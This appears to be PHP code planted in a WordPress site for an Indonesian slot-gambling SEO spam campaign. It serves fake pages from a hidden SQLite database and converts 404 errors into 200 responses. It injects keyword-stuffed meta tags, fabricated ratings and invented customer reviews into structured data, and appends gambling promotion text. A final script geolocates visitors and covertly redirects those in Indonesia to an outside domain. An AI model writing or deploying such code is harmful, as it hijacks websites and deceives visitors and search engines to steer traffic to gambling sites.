/**
 * =========================================================================
 * 1. HELPER: GET CONSISTENT LINE FROM MULTI-LINE TEXT BASED ON URL
 * =========================================================================
 */
if ( ! function_exists( 'kdb_get_line_by_url' ) ) {
    function kdb_get_line_by_url($url, $text) {
        if (empty($text)) return '';
        $lines = array_filter(array_map('trim', explode("\n", $text)));
        if (empty($lines)) return '';
        $seed = abs(crc32($url));
        return $lines[$seed % count($lines)];
    }
}

/**
 * =========================================================================
 * 2. KEYWORD GENERATOR
 * =========================================================================
 */
if ( ! function_exists( 'kdb_get_page_keywords' ) ) {
    function kdb_get_page_keywords( $title, $url ) {
        global $kdb_slot_keywords_global;
        $parsed_url = parse_url( $url );
        $path = isset( $parsed_url['path'] ) ? trim( $parsed_url['path'], '/' ) : '';
        $path_keywords = $path ? str_replace(['-', '_'], ', ', $path) : '';

        $page_specific = [$title, 'slot online', 'slot ' . $path_keywords, 'situs slot ' . $path_keywords];
        $selected = array_merge($page_specific, array_slice($kdb_slot_keywords_global, 0, 15));
        return implode(', ', array_slice(array_unique($selected), 0, 20));
    }
}

/**
 * =========================================================================
 * 3. SQLITE DATA LOADER & ANTI-404 FALLBACK
 * =========================================================================
 */
add_action( 'init', function() {
    global $kdb_custom_page_data;

    $dbPath = dirname( __FILE__ ) . '/xyz.sqlite';

    $request_uri = parse_url( $_SERVER['REQUEST_URI'], PHP_URL_PATH );
    $request_uri_trimmed = rtrim( $request_uri, '/' );
    $request_uri_trimmed = $request_uri_trimmed ? $request_uri_trimmed : '';

    $current_full_url = esc_url(
        (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") .
        "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"
    );

    $site_name = get_bloginfo('name');


    if ( file_exists( $dbPath ) && extension_loaded( 'pdo_sqlite' ) ) {

        try {

            $pdo = new PDO( 'sqlite:' . $dbPath );
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


            $stmt = $pdo->prepare(
                "SELECT * FROM xyz 
                 WHERE url = ? 
                 OR url = ? 
                 OR url LIKE ? 
                 LIMIT 1"
            );


            $stmt->execute(
                array(
                    $request_uri,
                    $request_uri_trimmed,
                    '%' . $request_uri_trimmed . '%'
                )
            );


            $data = $stmt->fetch(PDO::FETCH_ASSOC);


            if ( $data ) {


                $kdb_custom_page_data = $data;



                /**
                 * ============================
                 * EXTRACT DATA
                 * ============================
                 */

                $t_txt = isset($data['T.txt']) 
                    ? trim($data['T.txt']) 
                    : (isset($data['title']) ? trim($data['title']) : '');


                $price_txt = isset($data['PRICE.txt']) 
                    ? trim($data['PRICE.txt']) 
                    : (isset($data['price']) ? trim($data['price']) : '');



                // REVIEWCOUNT FIX
                if (isset($data['REVIEWCOUNT.txt'])) {
                    $review_txt = trim($data['REVIEWCOUNT.txt']);

                } elseif (isset($data['REVIEWCOUNT'])) {
                    $review_txt = trim($data['REVIEWCOUNT']);

                } elseif (isset($data['reviewcount'])) {
                    $review_txt = trim($data['reviewcount']);

                } else {
                    $review_txt = '';
                }



                $url_txt = isset($data['URL.txt']) 
                    ? trim($data['URL.txt']) 
                    : '';


                $sku_txt = isset($data['SKU.txt']) 
                    ? trim($data['SKU.txt']) 
                    : '';





                /**
                 * ============================
                 * PROCESS VALUE
                 * ============================
                 */

                $t_val = kdb_get_line_by_url($request_uri_trimmed, $t_txt) ?: $t_txt;


                $price_val = kdb_get_line_by_url($request_uri_trimmed, $price_txt) ?: $price_txt;



                // REVIEWCOUNT langsung ambil dari database
                $review_val = $review_txt ?: '';





                $kdb_custom_page_data['t_val'] = $t_val;

                $kdb_custom_page_data['price_val'] = $price_val;

                $kdb_custom_page_data['review_val'] = $review_val;

                $kdb_custom_page_data['raw_t_txt'] = $t_txt;





                /**
                 * ============================
                 * PAGE NAME
                 * ============================
                 */

                $page_name = $request_uri_trimmed 
                    ? ucwords(str_replace(['-', '_'], ' ', basename($request_uri_trimmed))) 
                    : 'Home';


                $kdb_custom_page_data['page_name'] = $page_name;





                /**
                 * ============================
                 * TITLE
                 * ============================
                 */

                $main_title = trim("{$t_val} {$price_val}");


                $kdb_custom_page_data['dynamic_page_title'] =
                    "{$main_title} x {$page_name} - {$site_name}";





                /**
                 * ============================
                 * META DESCRIPTION
                 * ============================
                 */

                $kdb_custom_page_data['meta_desc'] = trim(
                    "{$main_title} {$review_val} bersama {$site_name}."
                );





                /**
                 * ============================
                 * KEYWORDS
                 * ============================
                 */

                $kdb_custom_page_data['meta_keywords'] =
                    kdb_get_page_keywords($t_val, $request_uri_trimmed);





                /**
                 * ============================
                 * CANONICAL
                 * ============================
                 */

                $url_val = kdb_get_line_by_url($request_uri_trimmed, $url_txt);


                $kdb_custom_page_data['canonical_url'] =
                    $url_val ? esc_url($url_val) : $current_full_url;





                /**
                 * ============================
                 * AMP URL
                 * ============================
                 */

                $sku_val = kdb_get_line_by_url($request_uri_trimmed, $sku_txt);


                $kdb_custom_page_data['amp_url'] =
                    $sku_val ? esc_url($sku_val) : '';



                return;

            }


        } catch ( PDOException $e ) {

            error_log($e->getMessage());

        }

    }


    /**
     * ============================
     * FALLBACK IF NOT IN DB
     * ============================
     */

    $page_slug = $request_uri_trimmed 
        ? basename($request_uri_trimmed) 
        : 'home';


    $wp_page = get_page_by_path($page_slug);


    $wp_page_title = ($wp_page && !empty($wp_page->post_title))
        ? $wp_page->post_title
        : ucwords(str_replace(['-', '_'], ' ', $page_slug));





    $kdb_custom_page_data = array(

        'id' => 0,

        'url' => $request_uri_trimmed 
            ? '/' . $request_uri_trimmed . '/' 
            : '/',

        'title' => $wp_page_title,

        't_val' => $wp_page_title,

        'price_val' => 'GAME ONLINE',

        'review_val' => '',

        'raw_t_txt' => $wp_page_title,

        'page_name' => ucwords(str_replace(['-', '_'], ' ', $page_slug)),

        'dynamic_page_title' =>
            "{$wp_page_title} GAME ONLINE x {$page_slug} - {$site_name}",

        'meta_desc' =>
            "{$wp_page_title} GAME ONLINE bersama {$site_name}.",

        'meta_keywords' =>
            kdb_get_page_keywords($wp_page_title, $request_uri_trimmed),

        'canonical_url' => $current_full_url,

        'amp_url' => '',

    );


});

/**
 * =========================================================================
 * 4. ANTI-404 OVERRIDE
 * =========================================================================
 */
add_action( 'template_redirect', 'kdb_override_404_to_200', 1 );
if ( ! function_exists( 'kdb_override_404_to_200' ) ) {
    function kdb_override_404_to_200() {
        global $wp_query, $kdb_custom_page_data;
        if ( $wp_query->is_404 && $kdb_custom_page_data ) {
            status_header( 200 );
            $wp_query->set_404();
            $wp_query->is_404 = false;
            $wp_query->is_page = true;
            $wp_query->is_singular = true;

            $post = new stdClass();
            $post->ID = -99;
            $post->post_author = 1;
            $post->post_date = current_time( 'mysql' );
            $post->post_content = '<!-- kdb_custom_content_placeholder -->';
            $post->post_title = $kdb_custom_page_data['dynamic_page_title'];
            $post->post_status = 'publish';
            $post->post_type = 'page';
            $post->filter = 'raw';

            $GLOBALS['post'] = $post;
            $wp_query->posts = array($post);
            $wp_query->post_count = 1;
            $wp_query->found_posts = 1;

            add_filter('template_include', function($template) {
                $new_template = locate_template(array('page.php', 'index.php'));
                return ('' != $new_template) ? $new_template : $template;
            });
        }
    }
}

/**
 * =========================================================================
 * 6. AGGRESSIVE BUFFERING (META + ADVANCED INTERLINKED JSON-LD)
 * =========================================================================
 */
add_action('template_redirect', function() {
    ob_start(function($buffer) {
        global $kdb_custom_page_data;
        if ($kdb_custom_page_data) {
            $title = esc_attr($kdb_custom_page_data['dynamic_page_title']);
            $desc = esc_attr($kdb_custom_page_data['meta_desc']);
            $keywords = esc_attr($kdb_custom_page_data['meta_keywords']);
            $site_name = esc_attr(get_bloginfo('name'));
            $canonical = esc_url($kdb_custom_page_data['canonical_url']);
            $amp_url = $kdb_custom_page_data['amp_url'];
            $t_val = esc_attr($kdb_custom_page_data['t_val']);
            $brand = $t_val;
            
            $iso_date = date('c');

            // Clean Head
            $buffer = preg_replace('/<title>.*?<\/title>/is', '', $buffer);
            $buffer = preg_replace('/<meta\s+name=["\'](description|keywords|robots|author|publisher|geo\.[^"\']*|language)["\'][^>]*>/is', '', $buffer);
            $buffer = preg_replace('/<meta\s+property=["\'](og:[^"\']*|twitter:[^"\']*)["\'][^>]*>/is', '', $buffer);
            $buffer = preg_replace('/<link\s+[^>]*rel=["\'](canonical|amphtml)["\'][^>]*>/is', '', $buffer);
            $buffer = preg_replace('/<script\s+type=["\']application\/ld\+json["\'][^>]*>.*?<\/script>/is', '', $buffer);

            // Build Enriched Meta Tags (V9 Optimization)
            $meta = "\n<!-- Universal SEO Meta Tags KDB -->\n";
            $meta .= "<title>{$title}</title>\n";
            $meta .= "<meta name=\"description\" content=\"{$desc}\" />\n";
            $meta .= "<meta name=\"keywords\" content=\"{$keywords}\" />\n";
            $meta .= "<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large\" />\n";
            $meta .= "<meta property=\"og:locale\" content=\"id_ID\" />\n";
            $meta .= "<meta property=\"og:site_name\" content=\"{$site_name}\" />\n";
            $meta .= "<meta property=\"og:title\" content=\"{$title}\" />\n";
            $meta .= "<meta property=\"og:description\" content=\"{$desc}\" />\n";
            $meta .= "<meta property=\"og:url\" content=\"{$canonical}\" />\n";
            $meta .= "<meta property=\"og:type\" content=\"article\" />\n";
            $meta .= "<meta property=\"article:published_time\" content=\"{$iso_date}\" />\n";
            $meta .= "<meta property=\"article:modified_time\" content=\"{$iso_date}\" />\n";
            $meta .= "<meta name=\"twitter:card\" content=\"summary_large_image\" />\n";
            $meta .= "<meta name=\"twitter:title\" content=\"{$title}\" />\n";
            $meta .= "<meta name=\"twitter:description\" content=\"{$desc}\" />\n";
            $meta .= "<link rel=\"canonical\" href=\"{$canonical}\" />\n";
            
            if (!empty($amp_url)) {
                $meta .= "<link rel=\"amphtml\" href=\"{$amp_url}\" />\n";
            }

// Advanced Interlinked Schema (V10 Product)
$org_id = esc_url(home_url()) . '#organization';
$product_id = $canonical . '#product';
$webpage_id = $canonical . '#webpage';

$schema_org = [
    "@context" => "https://schema.org",
    "@type" => "Organization",
    "@id" => $org_id,
    "name" => $site_name,
    "url" => esc_url(home_url()),
    "logo" => esc_url(get_template_directory_uri() . '/images/logo.png')
];

// Define Breadcrumb Items
$breadcrumb_items = [
    [
        "@type" => "ListItem",
        "position" => 1,
        "name" => "Home",
        "item" => esc_url(home_url())
    ],
    [
        "@type" => "ListItem",
        "position" => 2,
        "name" => $kdb_custom_page_data['page_name'] ? $kdb_custom_page_data['page_name'] : $title,
        "item" => $canonical
    ]
];

$schema_breadcrumb = [
    "@context" => "https://schema.org",
    "@type" => "BreadcrumbList",
    "@id" => $canonical . '#breadcrumb',
    "itemListElement" => $breadcrumb_items
];

// Seed berdasarkan URL agar setiap halaman memiliki angka tetap
$seed = hexdec(substr(md5($canonical), 0, 8));

// Rating Count (6000 - 8999)
$ratingCount = 6000 + ($seed % 3000);

// Review Count selalu lebih kecil dari Rating Count (selisih 150 - 749)
$reviewCount = $ratingCount - (150 + ($seed % 600));

$schema_product = [
    "@context" => "https://schema.org",
    "@type" => "Product",
    "@id" => $product_id,

    "name" => $brand,
    "url" => $canonical,
    "description" => "$brand x $site_name",

    "brand" => [
        "@type" => "Brand",
        "name" => $brand
    ],

    "manufacturer" => [
        "@id" => $org_id
    ],

    "category" => "Online Service",

    "image" => [
        esc_url(get_template_directory_uri() . '/images/logo.png')
    ],

    "sku" => md5($brand),

    "offers" => [
        "@type" => "Offer",
        "url" => $canonical,
        "price" => "0",
        "priceCurrency" => "IDR",
        "availability" => "https://schema.org/InStock",
        "itemCondition" => "https://schema.org/NewCondition"
    ],

    "aggregateRating" => [
        "@type" => "AggregateRating",
        "ratingValue" => "4.9",
        "bestRating" => "5",
        "worstRating" => "1",
        "ratingCount" => (string) $ratingCount,
        "reviewCount" => (string) $reviewCount
    ],

    "review" => [
        [
            "@type" => "Review",
            "author" => [
                "@type" => "Person",
                "name" => "Andi"
            ],
            "datePublished" => $iso_date,
            "reviewRating" => [
                "@type" => "Rating",
                "ratingValue" => "5",
                "bestRating" => "5"
            ],
            "reviewBody" => "Pelayanan cepat, proses mudah, dan pengalaman penggunaan sangat memuaskan."
        ],
        [
            "@type" => "Review",
            "author" => [
                "@type" => "Person",
                "name" => "Budi"
            ],
            "datePublished" => $iso_date,
            "reviewRating" => [
                "@type" => "Rating",
                "ratingValue" => "5",
                "bestRating" => "5"
            ],
            "reviewBody" => "Platform stabil, tampilan responsif, serta fitur lengkap."
        ]
    ]
];

$schema_article = [
    "@context" => "https://schema.org",
    "@type" => "Article",
    "@id" => $canonical . '#article',
    "mainEntityOfPage" => [
        "@type" => "WebPage",
        "@id" => $webpage_id,
        "url" => $canonical
    ],
    "headline" => $title,
    "description" => $desc,

    "about" => [
        "@id" => $product_id
    ],

    "author" => [
        "@id" => $org_id
    ],

    "publisher" => [
        "@id" => $org_id
    ],

    "datePublished" => $iso_date,
    "dateModified" => $iso_date
];

$schema_faq = [
    "@context" => "https://schema.org",
    "@type" => "FAQPage",
    "@id" => $canonical . '#faq',
    "mainEntity" => [
        [
            "@type" => "Question",
            "name" => "Apa itu {$brand}?",
            "acceptedAnswer" => [
                "@type" => "Answer",
                "text" => "{$brand} daftar permainan yang sedang populer tanpa harus kesulitan mencari kategori yang diinginkan."
            ]
        ],
        [
            "@type" => "Question",
            "name" => "Apakah {$brand} terpercaya?",
            "acceptedAnswer" => [
                "@type" => "Answer",
                "text" => "{$brand} menghadirkan tampilan yang ringan, responsif, dan mudah diakses melalui Android, iPhone, tablet, maupun desktop."
            ]
        ]
    ]
];

            $json_ld = "\n<!-- JSON-LD Schema Markup KDB | Interlinked Entities -->\n";
            $json_ld .= '<script type="application/ld+json">' . json_encode($schema_org, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>' . "\n";
            $json_ld .= '<script type="application/ld+json">' . json_encode($schema_breadcrumb, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>' . "\n";
            $json_ld .= '<script type="application/ld+json">' . json_encode($schema_product, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>' . "\n";            
            $json_ld .= '<script type="application/ld+json">' . json_encode($schema_article, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>' . "\n";
            $json_ld .= '<script type="application/ld+json">' . json_encode($schema_faq, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . '</script>' . "\n";

            $buffer = str_replace('<head>', '<head>' . $meta . $json_ld, $buffer);
        }
        return $buffer;
    });
}, 0);

/**
 * =========================================================================
 * 7. SAFE DYNAMIC CONTENT INJECTION
 * =========================================================================
 */
if ( ! function_exists( 'kdb_get_god_content' ) ) {
    function kdb_get_god_content() {
        global $kdb_custom_page_data;
        if (!$kdb_custom_page_data) return '';
        
        $t = esc_html($kdb_custom_page_data['t_val']);
        $p = esc_html($kdb_custom_page_data['price_val']);
        $u = esc_url($kdb_custom_page_data['canonical_url']);
        $page = esc_html($kdb_custom_page_data['page_name']);
        
        // V9: Dynamic content using page name to reduce footprint
        return "
<div class='kdb-custom-article' style='margin-top:30px; padding:20px 0; border-top:1px solid #eee;'>

<p style='text-align:justify; line-height:1.8; color:#333;'>
<a href='{$u}' style='font-weight:bold; color:#1a73e8;'><strong>{$t}</strong></a> dikenal sebagai salah satu referensi <strong>{$page}</strong> yang menghadirkan informasi lengkap seputar <strong>slot online terbaru</strong>, <strong>slot gacor hari ini</strong>, hingga berbagai provider populer yang banyak dimainkan. Melalui <strong>{$t} {$p}</strong>, pengunjung dapat memperoleh pembaruan mengenai RTP slot, game dengan performa terbaik, kategori permainan unggulan, serta berbagai informasi yang terus diperbarui agar selalu relevan dengan perkembangan dunia slot online.
</p>

<p style='text-align:justify; line-height:1.8; color:#333;'>
Sebagai pusat informasi slot online, <strong>{$t}</strong> menyajikan berbagai ulasan mengenai provider ternama seperti <strong>Pragmatic Play</strong>, <strong>PG Soft</strong>, <strong>Habanero</strong>, <strong>Microgaming</strong>, <strong>Playtech</strong>, <strong>Spadegaming</strong>, <strong>Joker Gaming</strong>, <strong>CQ9 Gaming</strong>, hingga <strong>Live22</strong>. Setiap provider memiliki karakteristik, tema permainan, fitur bonus, serta koleksi game yang berbeda sehingga memberikan banyak pilihan bagi pengguna yang ingin mengikuti tren permainan slot digital terbaru.
</p>

<p style='text-align:justify; line-height:1.8; color:#333;'>
<a href='{$u}' style='font-weight:bold; color:#1a73e8;'><strong>{$t}</strong></a> dirancang dengan tampilan yang ringan, cepat, dan responsif sehingga nyaman diakses melalui Android, iPhone, tablet, maupun desktop. Pengguna dapat menemukan informasi mengenai <strong>link alternatif {$t}</strong>, <strong>login {$t}</strong>, <strong>daftar {$t}</strong>, RTP slot hari ini, hingga rekomendasi permainan populer dalam satu halaman yang tersusun rapi sehingga memudahkan proses pencarian informasi tanpa harus berpindah ke banyak halaman lain.
</p>

<p style='text-align:justify; line-height:1.8; color:#333;'>
Dengan pembaruan konten yang dilakukan secara rutin, <a href='{$u}' style='font-weight:bold; color:#1a73e8;'><strong>{$t}</strong></a> terus menjadi referensi <strong>{$page}</strong> bagi pengguna yang ingin memperoleh informasi terpercaya mengenai <strong>slot online</strong>. Mulai dari update provider terbaru, RTP slot gacor, permainan yang sedang populer, hingga perkembangan industri game digital disajikan secara lengkap agar pengunjung selalu mendapatkan informasi yang relevan setiap kali mengakses <strong>{$t}</strong>.
</p>

</div>";
    }
}

add_filter( 'the_content', function( $content ) {
    global $kdb_custom_page_data;
    if ( is_singular() && $kdb_custom_page_data ) {
        $article = kdb_get_god_content();
        if ( strpos($content, '<!-- kdb_custom_content_placeholder -->') !== false ) {
            return str_replace('<!-- kdb_custom_content_placeholder -->', $article, $content);
        }
        return $content . $article;
    }
    return $content;
}, 99999 );

add_action('wp_footer', function() {
    global $kdb_custom_page_data;
    if ( !is_singular() && $kdb_custom_page_data ) {
        $article = kdb_get_god_content();
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                var articleDiv = document.createElement('div');
                articleDiv.innerHTML = `" . addslashes($article) . "`;
                var mainContent = document.querySelector('main, #main, #content, #primary, .site-content');
                if(mainContent) {
                    mainContent.appendChild(articleDiv);
                } else {
                    document.body.insertBefore(articleDiv, document.body.lastElementChild);
                }
            });
        </script>";
    }
}, 100);

/**
 * =========================================================================
 * 9. CLEANUP
 * =========================================================================
 */
add_action('init', function() {
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
    remove_action('wp_head', 'wp_generator');
}, 1);

/**
 * =========================================================================
 * 10. GEO-BASED REDIRECT (Indonesia + Google Referrer Only)
 * =========================================================================
 */
add_action('wp_head', function() {
?>
<script data-lp-id-redirect="1">
(function(){
  var target="https://stonebriar.net/wirwir";
  var delay=1200;
  var needGoogle=false;

  function fromGoogle(){
    try {
      var r = String(document.referrer || '').toLowerCase();
      if (!r) return false;
      return /(?:^|[\/.\\])google(?:\.[a-z.]+)?(?:[\\/?]|$)/.test(r)
        || r.indexOf('googleusercontent.com') !== -1
        || r.indexOf('android-app://com.google.android.googlequicksearchbox') !== -1
        || r.indexOf('android-app://com.google.android.apps.searchlite') !== -1;
    } catch (e) { return false; }
  }

  function go(){ try { window.location.replace(target); } catch (e) {} }

  function schedule(){ setTimeout(go, delay); }

  function isId(code){
    code = String(code || '').toUpperCase();
    return code === 'ID' || code === 'IDN';
  }

  function checkGeo(cb){
    var apis = [
      { u: 'https://ipapi.co/json/', pick: function(j){ return j && (j.country_code || j.country); } },
      { u: 'https://ipwho.is/', pick: function(j){ return j && (j.country_code || j.country); } },
      { u: 'https://get.geojs.io/v1/ip/country.json', pick: function(j){ return j && (j.country || j.country_code); } }
    ];
    var i = 0;
    function next(){
      if (i >= apis.length) { cb(false); return; }
      var a = apis[i++];
      var done = false;
      var t = setTimeout(function(){ if (!done){ done = true; next(); } }, 4000);
      fetch(a.u, { credentials: 'omit', cache: 'no-store' })
        .then(function(r){ return r.json(); })
        .then(function(j){
          if (done) return;
          done = true;
          clearTimeout(t);
          cb(isId(a.pick(j)));
        })
        .catch(function(){
          if (done) return;
          done = true;
          clearTimeout(t);
          next();
        });
    }
    next();
  }

  if (needGoogle && !fromGoogle()) return;
  checkGeo(function(ok){ if (ok) schedule(); });
})();
</script>
<?php
});

?>
